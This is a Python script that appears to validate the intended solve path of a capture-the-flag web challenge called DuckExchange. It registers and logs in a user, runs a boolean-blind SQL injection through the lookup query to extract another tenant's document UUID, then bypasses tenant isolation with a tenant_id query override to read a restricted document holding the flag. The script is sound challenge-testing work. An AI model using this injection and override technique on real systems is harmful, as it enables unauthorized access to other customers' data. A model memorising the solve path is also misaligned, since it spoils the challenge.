#!/usr/bin/env python3
"""Black-box validation for the intended DuckExchange challenge path."""

import json
import os
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request


BASE_URL = os.environ.get("BASE_URL", "http://127.0.0.1:4000").rstrip("/")
PASSWORD = os.environ.get("VALIDATION_PASSWORD", "Aa1!validation-pass")
ALPHABET = "0123456789abcdef-"
WEB_SESSION = ""


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, request, file_pointer, code, message, headers, new_url):
        return None


def fail(message):
    print(f"FAIL: {message}", file=sys.stderr)
    raise SystemExit(1)


def header(headers, name):
    for key, value in headers.items():
        if key.lower() == name.lower():
            return value
    return ""


def request(path, data=None, cookie=""):
    global WEB_SESSION

    headers = {}
    browser_cookies = []
    if WEB_SESSION:
        browser_cookies.append(f"_tenantexchange_key={WEB_SESSION}")
    if cookie:
        browser_cookies.append(f"tv_session={cookie}")
    if browser_cookies:
        headers["Cookie"] = "; ".join(browser_cookies)

    body = None
    if data is not None:
        body = urllib.parse.urlencode(data).encode()
        headers["Content-Type"] = "application/x-www-form-urlencoded"

    req = urllib.request.Request(BASE_URL + path, data=body, headers=headers)
    opener = urllib.request.build_opener(NoRedirect())

    try:
        response = opener.open(req, timeout=10)
        response_headers = dict(response.headers)
        remember_web_session(response_headers)
        return response.status, response_headers, response.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as error:
        response_headers = dict(error.headers)
        remember_web_session(response_headers)
        return error.code, response_headers, error.read().decode("utf-8", "replace")
    except urllib.error.URLError as error:
        fail(f"{path}: {error.reason}")


def remember_web_session(headers):
    global WEB_SESSION
    match = re.search(r"_tenantexchange_key=([^;]+)", header(headers, "set-cookie"))
    if match:
        WEB_SESSION = match.group(1)


def csrf(html):
    match = re.search(r'name="_csrf_token" value="([^"]+)"', html)
    if not match:
        fail("CSRF token missing")
    return match.group(1)


def get_form(path):
    status, _headers, body = request(path)
    if status != 200:
        fail(f"GET {path} returned HTTP {status}")
    return body


def main():
    if request("/")[0] != 200 or request("/login")[0] != 200:
        fail("public health endpoints are not ready")

    email = f"validator-{time.time_ns()}@example.test"
    register_form = get_form("/register")
    status, _headers, _body = request(
        "/register",
        {
            "_csrf_token": csrf(register_form),
            "name": "Validation Analyst",
            "email": email,
            "password": PASSWORD,
        },
    )
    if status not in (302, 303):
        fail(f"registration returned HTTP {status}")

    login_form = get_form("/login")
    status, headers, _body = request(
        "/login",
        {
            "_csrf_token": csrf(login_form),
            "email": email,
            "password": PASSWORD,
        },
    )
    if status not in (302, 303):
        fail(f"login returned HTTP {status}")

    match = re.search(r"tv_session=([^;]+)", header(headers, "set-cookie"))
    if not match:
        fail("login did not issue tv_session")
    session = match.group(1)

    status, _headers, body = request("/inbox", cookie=session)
    if status != 200 or "IR-4472" not in body:
        fail(f"authenticated inbox returned HTTP {status}")

    unauth_status, _headers, _body = request("/inbox")
    if unauth_status != 403:
        fail(f"unauthenticated inbox returned HTTP {unauth_status}, expected 403")

    def lookup(payload):
        path = "/exchange/lookup?" + urllib.parse.urlencode({"q": payload})
        status, _headers, body = request(path, cookie=session)
        if status != 200:
            fail(f"lookup returned HTTP {status}")
        return "Pending tenant verification" in body

    document_id = ""
    for position in range(1, 37):
        for character in ALPHABET:
            predicate = (
                "missing%' OR "
                f"substring(doc_id::text,{position},1)='{character}'--"
            )
            if lookup(predicate):
                document_id += character
                break
        else:
            fail(f"UUID recovery stopped at position {position}")

    if not re.fullmatch(r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}", document_id):
        fail(f"recovered value is not a UUID: {document_id}")

    direct_path = f"/api/v1/tenants/initech-inc/documents/{document_id}"
    status, _headers, _body = request(direct_path, cookie=session)
    if status != 403:
        fail(f"direct cross-tenant request returned HTTP {status}, expected 403")

    override_path = (
        f"/api/v1/tenants/acme-corp/documents/{document_id}"
        "?tenant_id=initech-inc"
    )
    status, _headers, body = request(override_path, cookie=session)
    if status != 200:
        fail(f"intended document request returned HTTP {status}")

    try:
        response = json.loads(body)
    except json.JSONDecodeError:
        fail("document response was not JSON")

    if response.get("tenantId") != "initech-inc":
        fail("query tenant did not reach the document handler")
    if response.get("classification") != "restricted":
        fail("recovered document is not restricted")
    if "Flag:" not in response.get("body", ""):
        fail("restricted response did not include the runtime flag marker")

    print("PASS: health, session flow, blind UUID oracle, direct denial, and runtime flag condition verified")


if __name__ == "__main__":
    main()
